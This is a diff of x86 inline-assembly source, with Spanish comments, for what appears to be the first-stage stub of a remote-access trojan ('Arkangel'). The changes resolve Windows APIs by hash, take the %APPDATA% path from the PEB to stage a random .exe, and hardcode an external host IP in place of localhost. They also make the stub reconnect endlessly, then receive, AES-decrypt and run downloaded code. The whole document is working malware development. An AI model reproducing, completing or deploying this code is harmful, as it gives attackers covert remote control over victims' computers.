@@ -49,8 +49,8 @@ find_delta:
         #endif //SC_NULL
 #endif //SC_DELTA
 
-        //Pasamos inicio real del código saltando sobre las constantes.
-        jmp  start
+        //Saltamos los hashes.
+        jmp  over_hashes
     }
 #pragma region constantes
         /*###############################################################################
@@ -71,8 +71,8 @@ kernel32_symbol_hashes:
         API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
         API_DEFINE(VirtualAlloc, ('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
         API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A'))
-        API_DEFINE(GetTempPathA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('P') ('a') ('t') ('h') ('A'))
         API_DEFINE(GetTempFileNameA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('F') ('i') ('l') ('e') ('N') ('a') ('m') ('e') ('A'))
+        API_DEFINE(CopyFileA, ('C') ('o') ('p') ('y') ('F') ('i') ('l') ('e') ('A'))
 
 ws2_32_symbol_hashes:
         #define ws2_32_count    8
@@ -95,8 +95,10 @@ advapi32_symbol_hashes:
 #pragma endregion
 
 #pragma region VARS
+        VAR_DEFINE(APPDATA)
         VAR_DEFINE(pHOST)
         VAR_DEFINE(pKEY)
+        VAR_DEFINE(pMUTEX)
         VAR_DEFINE(hProv)
         VAR_DEFINE(hKey)
         VAR_DEFINE(hSocket)
@@ -105,6 +107,12 @@ advapi32_symbol_hashes:
 #pragma endregion
         CALC_STACKSIZE()
 //¡¡¡¡CONSTANTES TEMPORALES!!!!
+    __asm{
+over_hashes:
+        //Saltamos sobre la configuración
+        jmp  over_config
+    }
+config_start:
 KEY:   	//typedef struct aes128Blob{
             //BLOBHEADER{
                 /*bType*/       EMIT_BYTE(PLAINTEXTKEYBLOB)
@@ -113,24 +121,32 @@ KEY:   	//typedef struct aes128Blob{
                 /*aiKeyAlg*/    EMIT_DWORD(CALG_AES_128)
             //}
             /*keySize*/         EMIT_DWORD(0x10)
-            /*keydata[16]*/     EMIT_BYTE_ARRAY( (0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04))	
+            /*keydata[16]*/     EMIT_BYTE_ARRAY((0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04))	
+            //SHA1("karcrack:1234")
         //}
-HOST:   EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
-MUTEX:  EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h') ('R')(0))
+MUTEX:  EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h')(0))
+HOST:   //EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
+        EMIT_BYTE_ARRAY(('2') ('1') ('3') ('.') ('6') ('0') ('.') ('1') ('4') ('4') ('.') ('1') ('7') ('7')(0)) //213.60.144.177
+config_end:
 #pragma endregion
     __asm{
+over_config:
+        //Pasamos inicio real del código saltando sobre las funciones.
+        jmp  start
 #ifdef ERR_CHECK
 /*###############################################################################
 ** gtfo:
 **    Método para salir en cualquier momento de la ejecución sin mostrar ningún
 **    error crítico, además es usado para tener una mejor idea de lo ocurrido
 *###############################################################################*/
-
 gtfo:
+        pop  edx
         test eax, eax
         jne  conti
         call [ebp+_ExitProcess]
 conti:
+        add  esp, 0x4
+        push edx
         ret
 #endif //ERR_CHECK
 CreateBuff:
@@ -155,43 +171,6 @@ start:
         *###############################################################################*/
         sub  esp, (STACKSIZE)
         mov  ebp, esp
-        movr(esi, KEY)
-        mov  [ebp+_pKEY], esi
-        lea  ebx, [esi+28]
-        mov  [ebp+_pHOST], ebx
-
-#pragma region CRYPT_DATA
-/*
-        #define BLOCK_SIZE 38
-        sub  esp, (40)                  //<<<<PARCHEAR EN EL BUILDER
-        #ifdef SC_DELTA
-        mov  eax, edi                   //Guardamos el Delta Offset
-        #endif
-        xor  ecx, ecx                   //ECX = 0
-        movr(esi, KEY)                  //Puntero al inicio del bloque
-        mov  cl, BLOCK_SIZE             //<<<<PARCHEAR EN EL BUILDER (TAMAÑO del bloque)
-        lea  edi, [esp+STACKSIZE]       //Puntero del stack donde se copiara el bloque
-        mov  [ebp+_pKEY], edi           //Almacenamos el puntero a KEY
-        lea  ebx, [edi+28]              //
-        mov  [ebp+_pHOST], ebx          //Almacenamos el puntero al HOST
-        mov  ebx, edi
-        rep  movsb                      //Copiamos el bloque al stack
-        mov  cl, (40)/8                 //<<<<TAMAÑO del bloque alineado a 8 y partido entre 8
-
-        EMIT_WORD(0xE3DB) //finit       //Iniciamos la FPU
-        fldpi                           //mm7 = pi
-Redo:
-        lea  edx, [ebx+(ecx*8)-8]       //Siguiente bloque
-        movq mm0, QWORD PTR[edx]        //
-        pxor mm0, mm7                   //
-        movq QWORD PTR[edx], mm0        //
-        loop Redo                       //¡Repetimos!
-
-        #ifdef SC_DELTA
-        mov edi, eax                    //Restauramos el Delta Offset
-        #endif
-*/
-#pragma endregion
 
         /*###############################################################################
         ** Carga de APIs:
@@ -204,6 +183,24 @@ Redo:
         push 0x30                       //v
         pop  esi                        //v
         lods DWORD PTR FS:[esi]         //>EAX = &(PEB)
+        /*###############################################################################
+        ** Obtención de %APPDATA%:
+        ** Aprovechamos que hemos sacado el PEB para obtener kernel32 y
+        ** recorremos el bloque de environments en busca de APPDATA=*
+        *###############################################################################*/
+        push eax                        //Guardamos EAX
+        push edi                        //Guardamos el Delta
+        mov  eax, [eax+0x10]            //EAX = &RTL_USER_PROCESS_PARAMETERS
+        mov  edi, [eax+0x48]            //EDI = Environment
+        mov  eax, 0x003D0041            //EAX = "A\0=\0"
+redo:
+        dec edi                         //v
+        dec edi                         //> EDI-=2
+        scasd                           //¿[EDI] == EAX?; EDI+=4
+        jnz redo
+        mov  [ebp+_APPDATA], edi        //Almacenamos el puntero a APPDATA (UNICODE)
+        pop  edi                        //Recuperamos el Delta
+        pop  eax                        //Recuperamos EAX
         mov  esi, [eax+0x0C]            //ESI = PEB->Ldr
         mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
 next_module:
@@ -217,7 +214,7 @@ find_kernel32_finished:
         movr(ecx, LoadFunctions)        // Puntero a LoadFunctions()
         movr(esi, kernel32_symbol_hashes)// Puntero al primer hash
 
-        //Cargamos las apis de kernel32 en la pila a partir de los hashes
+        //Cargamos las APIs de kernel32 en la pila a partir de los hashes
         push kernel32_count             //v Número de hashes de kernel32
         call ecx                        //>LoadFunctions(kernel32_count);
         mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA]//EBX = &LoadLibraryA
@@ -250,11 +247,30 @@ find_kernel32_finished:
         push advapi32_count             //v Número de hashes de advapi32
         call ecx                        //>LoadFunctions(advapi32_count);
 
+        add  esp, 0xC                   //Reparamos el stack después de las llamadas a LoadFunctions()
         //Volvemos a apuntar al inicio del stack de APIs
-        sub  ebp, STACKSIZE - 0xC
+        sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4
+
+
+        //ARREGLAR
+        //movr(esi, config_start)
+        //mov  eax, 0x7F
+        //call CreateBuff
+
+        movr(eax, KEY)
+
+        mov  [ebp+_pKEY], eax
+        lea  ebx, [eax+0x1C]
+        mov  [ebp+_pMUTEX], ebx
+        add  ebx, 0x8
+        mov  [ebp+_pHOST], ebx
+
+#pragma region DECRYPT_DATA
+
+#pragma endregion
 
         cdq                             //EDX = 0
-        pushr(MUTEX)                    //v
+        push [ebp+_pMUTEX]              //v
         push edx                        //v
         push edx                        //v
         call [ebp+_CreateMutexA]        //> CreateMutexA(NULL, False, &MUTEX)
@@ -272,30 +288,39 @@ find_kernel32_finished:
 nomtx:
 #endif //ERR_CHECK
 
-        push 79                         //v
-        pop  eax                        //>EAX = 79
+        push 0x7F                       //v
+        pop  eax                        //>EAX = 7F
         call CreateBuff                 //Creamos Buffer para la ruta
         mov  edi, eax                   //EDI = EAX
+        mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
 
-        push eax                        //v
-        push 79                         //v
-        call [ebp+_GetTempPathA]        //>GetTempPathA(512, Buff);
-
+copy_again:                             //Copiamos %APPDATA% en el buffer
+        lodsb
+        test al, al
+        jz copy_done
+        stosb
+        inc esi
+        jmp copy_again
+copy_done:
+        //Añadimos a %APPDATA% un nombre al azar.
         cdq                             //EDX = 0
         push edi                        //v
         push edx                        //v
         push edx                        //v
         push edi                        //v
         call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);
+        //Reemplazamos la extensión a ".exe"
+        mov  DWORD PTR[edi+5],'exe.'
 
-#define BUFF_SIZE 0x1010101
-_cont:  mov  eax, BUFF_SIZE             //EAX = BUFF_SIZE
+#define BUFF_SIZE 0x5000
+_cont:  xor  eax, eax                   //EAX = 0
+        mov  ah, 0x50                   //EAX = BUFF_SIZE
         call CreateBuff
         mov  [ebp+_pBuff], eax          //pBuffer = EAX
 
         /*###############################################################################
         ** Creación del socket:
-        **    Una vez cargadas todas las APIs que necesitaremos de las distintas librerias
+        **    Una vez cargadas todas las APIs que necesitaremos de las distintas librerías
         **    creamos el socket para conectarnos al cliente e iniciar la autentificación.
         **    Otra vez más utilizamos el stack para evitar crear buffers innecesarios.
         *###############################################################################*/
@@ -329,61 +354,53 @@ newSocket:
         call [ebp+_WSASocketA]          //>WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
         mov  [ebp+_hSocket], eax        //hSocket = EAX
 
+connect_loop:
         //Obtenemos la dirección válida
         push [ebp+_pHOST]               //v
         call [ebp+_gethostbyname]       //>gethostbyname(&HOST);
+        
+        test eax, eax                   //v
+        jz  sleep_and_loop              //> Si ha habido algún error obteniendo el HOST repetimos
 
-#ifdef ERR_CHECK
-        push ERR_HST                    //v
-        call gtfo                       //>EAX!=0? (Si fallamos al obtener el host mejor salimos...)
-#endif //ERR_CHECK
         add  eax, 0x20                  //EAX = hostent.h_name
         push eax                        //v
         call [ebp+_inet_addr]           //>inet_addr(hostent.h_name);
 
 #define PORT 0xD0070002
-
         //Construimos la sockaddr_in en la pila
         push eax                        //push IP
         pushc(PORT)                     //push PORT            (TODO:<<<< EL BUILDER PARCHEARÁ ESTO!!!! :D)
         mov  ebx, esp                   //EBX = &sockaddr_in
 
-        //Conectamos al cliente haciendo un máximo de 121 intentos cada 0x1337ms
-rst:    
-        push 0x79                       //v
-        pop  ecx                        //>ECX = 121
-doConnect:
         push 0x10                       //v size(sockaddr_in)
         push ebx                        //v
         push [ebp+_hSocket]             //v
         call [ebp+_connect]             //>connect(hSocket, &sockaddr_in, size(sockaddr_in));
+        add  esp, 0x8                   //Reparamos la pila eliminando sockaddr_in
         test eax, eax                   //v
         jge  connected                  //>(EAX>=0)? (Conectamos con éxito, sigamos!)
-        loop doConnect                  //(ECX>0)? (Intentamos conectar de nuevo... hasta 121 veces)
-        //No ha habido suerte conectando... esperemos 0x1E40ms y volvamos a intentar
+
+sleep_and_loop:
 #ifdef SC_NULL
-        push 0x79                       //v
-        shl  DWORD PTR[esp], 0x6        //v
+        push 0x7F                       //v
+        shl  DWORD PTR[esp], 0x3        //v
 #else //SC_NULL
-        push 0x1E40                     //v
+        push 0x3F8                      //v
 #endif //SC_NULL
-        call [ebp+_Sleep]               //Sleep(0x1E40);
-        jmp  rst
+        call [ebp+_Sleep]               //Sleep(0x3F8);
+        jmp  connect_loop
 connected:
-        add  esp, 0x8                   //Reparamos la pila eliminando sockaddr_in
 
         /*###############################################################################
         ** Recepción de datos desde el cliente:
         **  Una vez establecida la conexión con éxito intentamos recibir 
         **  el paquete inicial compuesto de:
-        **      IV+checksum+SizePayload+LOADER_IAT+CARGADOR
+        **      IV+checksum+LOADER_IAT+CARGADOR
         **  Siendo cada uno:
-        **      *IV(16bytes)    : Vector de inicializacion para el cifrado
+        **      *IV(16bytes)    : Vector de inicialización para el cifrado
         **{{
-        **      *checksum       : checksum de todo el paquete a partir del SizePayload(inclusive), para evitar error crítico al ejecutar.
-        **      *SizePayload    : sizeof(LOADER_IAT+CARGADOR+4)
-        **      *LOADER_IAT     : Loader de Arkangel encargado de ubicar y ejecutar el cargador de plugins
-        **      *CARGADOR       : Cargador de plugins... encargado de gestionar la conexión
+        **      *checksum       : checksum de todo el payload, para evitar error crítico al ejecutar.
+        **      *LOADER_IAT     : Loader de Arkangel encargado de descargar, ubicar y ejecutar el cargador de plugins.
         **}}
         **  Lo envuelto entre {{*}} viene cifrado en AES-128-cbc usando como clave el hash SHA1(user+pass)
         *###############################################################################*/
@@ -395,15 +412,15 @@ recibir:
         push [ebp+_hSocket]             //v
         call [ebp+_recv]                //>recv(hSocket, pBuff, BUFF_SIZE, MSG_WAITALL);
         mov  [ebp+_buffLen], eax        //buffLen = EAX
-        test eax, eax                   //v
-        jg   init_decrypt               //>EAX>0? (Todo correcto? Procedemos a descifrar)
+        cmp  eax, 0x7F                  //> Suficientes Bytes para no generar problemas
+        jg   init_decrypt               //>EAX>7F? (Todo correcto? Procedemos a descifrar)
 KillSocket:
         push [ebp+_hSocket]             //v
         call [ebp+_closesocket]         //>closesocket(hSocket);
         jmp  newSocket                  //Creamos un nuevo socket
 
         /*###############################################################################
-        ** Descrifrado y autentificación:
+        ** Descifrado y autentificación:
         **    Una vez obtenidos los datos comprobamos que el emisor ha sido el cliente.
         **    Para esto los desciframos con la clave compartida que tenemos (SHA1(user+pass))
         **    Luego, para evitar ejecutar código erróneo comprobamos el checksum
@@ -427,7 +444,7 @@ init_decrypt:
         //Importamos la clave
         cdq                             //EDX = 0
         push ebp                        //v
-        add  [esp], _hKey               //v Direccion a la variable que contendra el Handler a la key
+        add  [esp], _hKey               //v Dirección a la variable que contendrá el Handler a la key
         push edx                        //v
         push edx                        //v
         push 0x1C                       //v sizeof(aes128Blob)
@@ -435,7 +452,7 @@ init_decrypt:
         push [ebp+_hProv]               //v
         call [ebp+_CryptImportKey]      //>CryptImportKey(hCryptProv, (BYTE*)&blob, sizeof(aes128Blob), 0, 0, &hKey);
 
-        //Seteamos el valor del IV(Inicializacion Vector)
+        //Establecemos el valor del IV(Initialization Vector)
         cdq                             //EDX = 0
         push edx                        //v
         push [ebp+_pBuff]               //v
@@ -448,7 +465,7 @@ init_decrypt:
         sub  [ebp+_buffLen], 16         //buffLen-= 16
 
         //Finalmente desciframos los datos obtenidos
-        //Los datos se encuentran en el paquete asi: IV(16Bytes)+DataEncrypt
+        //Los datos se encuentran en el paquete así: IV(16Bytes)+DataEncrypt
 
         cdq                             //EDX = 0
 
@@ -463,18 +480,21 @@ init_decrypt:
         call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, False, 0, pBuff, &buffLen);
 
         pop  ecx                        //Borramos la variable temporal
-
+        test eax, eax                   //v
+        jz   KillSocket                 //(EAX==0)? Si EAX es cero es que no se ha descifrado correctamente.
+                                        // Posiblemente la cantidad recibida no sea multiple de 16
         /*###############################################################################
         ** Comprobación del checksum:
         **    El checksum esta en +16 de los datos recibidos.
         **    El algoritmo utilizado para calcular el checksum es: 
         **        *FNV1a (http://goo.gl/1A7ir)
+        **    (Elegido por una buena relación tamaño-calidad)
         *###############################################################################*/
 
-        mov  esi, [ebp+_pBuff]          //ESI = pBuff
+        mov  esi, [ebp+_pBuff]          //ESI = pBuff = &Checksum
+        sub  ecx, 4                     //ECX = SizePayload
+        mov  ebx, [esi]                 //EBX = CheckSum
         add  esi, 4                     //ESI+= 4 (saltamos checksum)
-        mov  ecx, [esi]                 //ECX = SizePayload
-        mov  ebx, [esi-4]               //EBX = CheckSum
         cdq                             //hash = 0
 FNV1a:
         lodsb                           //al = str[i]; i++;
@@ -483,11 +503,9 @@ FNV1a:
         loop FNV1a                      //>(len--);(len < 0)?
 
         cmp  edx, ebx
-        jne  KillSocket                 //>(EDX==checksum?)Si es igual a cero significa que los datos recibidos eran correctos
+        jne  KillSocket                 //>(EDX==checksum?)
 
-        //Si el checksum no es igual algo falla... reseteamos la conexión
-
-NoErr4: push [ebp+_pKEY]                //v
+        push [ebp+_pKEY]                //v
         push [ebp+_hSocket]             //v
         push [ebp+_GetProcAddress]      //v
 #ifdef SC_NULL
@@ -497,8 +515,8 @@ NoErr4: push [ebp+_pKEY]                //v
         push [ebp+_LoadLibraryA]        //v
 #endif //SC_NULL
         mov  eax, [ebp+_pBuff]          //v
-        add  eax, 0x8                   // Saltamos hasta el cargador_IAT
-        call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);*/
+        add  eax, 0x4                   // Saltamos hasta el cargador_IAT
+        call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);
     }
 }
 
@@ -506,7 +524,7 @@ NoErr4: push [ebp+_pKEY]                //v
 ** LoadFunctions:
 **  Método encargado de rellenar el stack de direcciones.
 **  Llama a la función FindFunction() por cada hash en la lista
-**  almacenando la dirección en su respectiva posicion del stack.
+**  almacenando la dirección en su respectiva posición del stack.
 **  RECIBE BASEADDRESS EN EAX y el puntero a HASHES en ESI
 *###############################################################################*/
 void __declspec(naked) LoadFunctions(DWORD numHashes){
@@ -584,7 +602,7 @@ find_function_finished:
         popad
 #pragma endregion AX=HASH;EDX=BaseAddr
 
-        //Guardamos dir en buffer pila
+        //Guardamos dirección en buffer pila
         stosd
         loop nextFunction               //(ECX--);(ECX!=0)?
         mov  ebp, edi
